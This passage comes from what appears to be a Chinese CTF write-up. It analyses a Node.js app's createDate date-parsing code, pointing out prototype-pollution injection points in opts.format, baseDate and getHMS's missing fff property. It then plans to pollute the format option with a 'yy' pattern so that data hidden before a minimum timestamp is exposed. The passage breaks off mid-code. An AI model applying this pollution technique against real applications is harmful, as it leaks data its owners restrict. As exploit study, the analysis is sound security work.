class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\\x1b[33m</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>e<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\\x1b[0m</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Try using default value </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span><span class=\"token constant\">DEFAULT_CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        minTimestamp <span class=\"token operator\">=</span> <span class=\"token function\">createDate</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DEFAULT_CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token constant\">UTC</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">baseDate</span><span class=\"token operator\">:</span> LauchTime <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    timestamp <span class=\"token operator\">=</span> Math<span class=\"token punctuation\">.</span><span class=\"token function\">max</span><span class=\"token punctuation\">(</span>timestamp<span class=\"token punctuation\">,</span> minTimestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">const</span> data <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> sql<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>timestamp<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">throw</span> e <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> data<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>minTimestamp 取自配置文件，在 Math.max 处为可控的 timestamp 设置下限值，我们需要将 minTimestamp 改小来获取更早的数据库数据</p>\n<p>追踪 createDate，在 routes/_components/utils.js 中</p>\n<p>存在几个注入点</p>\n<p>opts 注入点</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token constant\">DEFAULT_CREATE_DATE_OPTIONS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token constant\">UTC</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token literal-property property\">format</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token string\">\"yyyy-MM-dd HH:mm:ss\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token string\">\"yyyy-MM-dd HH:mm:ss.fff\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token string\">\"yyyy-MM-dd\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token string\">\"MM/dd/yyyy\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token string\">\"MM/dd/yyyy HH:mm:ss\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token string\">\"MM/dd/yyyy HH:mm:ss.fff\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token string\">\"MM/dd/yy HH:mm:ss\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token string\">\"HH:mm:ss\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token string\">\"HH:mm:ss.fff\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token comment\">// baseDate: undefined</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> CopiedDefaultOptions <span class=\"token operator\">=</span> <span class=\"token function\">copyJSON</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DEFAULT_CREATE_DATE_OPTIONS</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> opts <span class=\"token operator\">===</span> <span class=\"token string\">\"undefined\"</span><span class=\"token punctuation\">)</span> opts <span class=\"token operator\">=</span> CopiedDefaultOptions</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> opts <span class=\"token operator\">!==</span> <span class=\"token string\">\"object\"</span><span class=\"token punctuation\">)</span> opts <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token operator\">...</span>CopiedDefaultOptions<span class=\"token punctuation\">,</span> <span class=\"token constant\">UTC</span><span class=\"token operator\">:</span> <span class=\"token function\">Boolean</span><span class=\"token punctuation\">(</span>opts<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>opts<span class=\"token punctuation\">.</span><span class=\"token constant\">UTC</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">typeof</span> opts<span class=\"token punctuation\">.</span><span class=\"token constant\">UTC</span> <span class=\"token operator\">===</span> <span class=\"token string\">\"undefined\"</span> <span class=\"token operator\">?</span> CopiedDefaultOptions<span class=\"token punctuation\">.</span><span class=\"token constant\">UTC</span> <span class=\"token operator\">:</span> <span class=\"token function\">Boolean</span><span class=\"token punctuation\">(</span>opts<span class=\"token punctuation\">.</span><span class=\"token constant\">UTC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>opts<span class=\"token punctuation\">.</span>format <span class=\"token operator\">=</span> opts<span class=\"token punctuation\">.</span>format <span class=\"token operator\">||</span> CopiedDefaultOptions<span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>Array<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span>opts<span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> opts<span class=\"token punctuation\">.</span>format <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>opts<span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>opts<span class=\"token punctuation\">.</span>format <span class=\"token operator\">=</span> opts<span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">f</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">typeof</span> f <span class=\"token operator\">===</span> <span class=\"token string\">\"string\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">f</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">yy|yyyy|MM|dd|HH|mm|ss|fff</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Invalid format \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>f<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\".</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">At least one format specifier is required.</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">|</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>f<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">|</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">yyyy</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">yy|MM|dd|HH|mm|ss|fff</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Invalid format \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>f<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\".</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Delimeters are required between format specifiers.</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yyyy\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">yyyy</span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Invalid format \"</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>f<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\".</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\"yyyy\" and \"yy\" cannot be used together.</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>opts<span class=\"token punctuation\">.</span>baseDate <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span>opts<span class=\"token punctuation\">.</span>baseDate <span class=\"token operator\">||</span> Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>当 createDate 的 opts 未指定时并不能注入，但是当 opts 为 JSON 对象且没有指定 format 属性时，下面这一行会触发原型链</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>opts<span class=\"token punctuation\">.</span>format <span class=\"token operator\">=</span> opts<span class=\"token punctuation\">.</span>format <span class=\"token operator\">||</span> CopiedDefaultOptions<span class=\"token punctuation\">.</span>format<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>而对于 baseDate，由于 DEFAULT_CREATE_DATE_OPTIONS 中本身不含 baseDate，可直接触发该原型链</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>opts<span class=\"token punctuation\">.</span>baseDate <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span>opts<span class=\"token punctuation\">.</span>baseDate <span class=\"token operator\">||</span> Date<span class=\"token punctuation\">.</span><span class=\"token function\">now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>时间函数注入点</p>\n<p>在 utility functions 的注释部分存在函数</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">getHMS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">time</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">let</span> regres <span class=\"token operator\">=</span> <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">^(\\d+) *\\: *(\\d+)( *\\: *(\\d+)( *\\. *(\\d+))?)?$</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span><span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>regres <span class=\"token operator\">===</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">let</span> <span class=\"token punctuation\">[</span>n1<span class=\"token punctuation\">,</span> n2<span class=\"token punctuation\">,</span> n3<span class=\"token punctuation\">,</span> n4<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>regres<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> regres<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> regres<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> regres<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">t</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">typeof</span> t <span class=\"token operator\">===</span> <span class=\"token string\">\"undefined\"</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">undefined</span> <span class=\"token operator\">:</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> n3 <span class=\"token operator\">===</span> <span class=\"token string\">\"undefined\"</span><span class=\"token punctuation\">)</span> n3 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 23:59(:59)?</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0</span> <span class=\"token operator\">&lt;=</span> n1 <span class=\"token operator\">&amp;&amp;</span> n1 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">23</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&lt;=</span> n2 <span class=\"token operator\">&amp;&amp;</span> n2 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">59</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token number\">0</span> <span class=\"token operator\">&lt;=</span> n3 <span class=\"token operator\">&amp;&amp;</span> n3 <span class=\"token operator\">&lt;=</span> <span class=\"token number\">59</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// 23:59:59(.999)?</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">let</span> <span class=\"token constant\">HH</span> <span class=\"token operator\">=</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>n1<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> mm <span class=\"token operator\">=</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>n2<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ss <span class=\"token operator\">=</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>n3<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            fff <span class=\"token operator\">=</span> <span class=\"token keyword\">typeof</span> n4 <span class=\"token operator\">===</span> <span class=\"token string\">\"undefined\"</span> <span class=\"token operator\">?</span> <span class=\"token keyword\">undefined</span> <span class=\"token operator\">:</span> <span class=\"token function\">pad</span><span class=\"token punctuation\">(</span>n4<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">const</span> o <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token constant\">HH</span><span class=\"token punctuation\">,</span> mm<span class=\"token punctuation\">,</span> ss <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">typeof</span> fff <span class=\"token operator\">!==</span> <span class=\"token string\">\"undefined\"</span><span class=\"token punctuation\">)</span> o<span class=\"token punctuation\">.</span>fff <span class=\"token operator\">=</span> fff<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> o<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当传入的传入 time 中不包含毫秒时，返回的对象中不会带有 fff 属性</p>\n<p>调用 getHMS 函数的地方在 createDate 的末尾几行，属于 createDate 的 Fallback Auto Detection 部分</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token constant\">HH</span><span class=\"token punctuation\">,</span> mm<span class=\"token punctuation\">,</span> ss<span class=\"token punctuation\">,</span> fff <span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">=</span> <span class=\"token function\">getHMS</span><span class=\"token punctuation\">(</span>time_str<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>当 time_str 中不包含毫秒，能够触发原型链</p>\n<p>接下来就是如何利用漏洞的问题了</p>\n<p>我们发现 createDate 的 opts 的 format 支持 yy 标识符，而当年份小于 100 时，我们认为是 20 世纪的年份</p>\n<p>举例来说，如果 format 为 20yy-MM-dd，在 format 解析字符串 2023-10-01 时，将解析 yy 为 23，输出输出为 1923，最终输出的年份是 1923-10-01</p>\n<p>目标：污染 format</p>\n<p>前面提到，污染 format 的条件是 opts 为 JSON 对象且没有指定 format 属性，观察 routes/info 中的相应片段，我们需要触发下面的 catch</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    minTimestamp <span class=\"token operator\">=</span> <span class=\"token function\">createDate</span><span class=\"token punctuation\">(</span><span class=\"token constant\">CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>Number<span class=\"token punctuation\">.</span><span class=\"token function\">isSafeInteger</span><span class=\"token punctuation\">(</span>minTimestamp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Invalid configuration min_public_time.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\\x1b[33m</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>e<span class=\"token punctuation\">.</span>message<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">\\x1b[0m</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">Try using default value </span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span><span class=\"token constant\">DEFAULT_CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">.</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    minTimestamp <span class=\"token operator\">=</span> <span class=\"token function\">createDate</span><span class=\"token punctuation\">(</span><span class=\"token constant\">DEFAULT_CONFIG</span><span class=\"token punctuation\">.</span>min_public_time<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token constant\">UTC</span><span class=\"token operator\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> <span class=\"token literal-property property\">baseDate</span><span class=\"token operator\">:</span> LauchTime <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>触发 catch 的条件是前面 try 的 createDate 返回一个无效的日期，或者 createDate 本身被调用时法神错误</p>\n<p>目标：触发 createDate 错误，或使 createDate 返回无效日期</p>\n<p>需要利用刚才剩余的两个注入点</p>\n<p>下面的这行代码表明了基于 format 的日期匹配不可能返回一个无效日期，因此返回无效日期只有 Fallback Auto Detection 能够做到</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Number<span class=\"token punctuation\">.</span><span class=\"token function\">isSafeInteger</span><span class=\"token 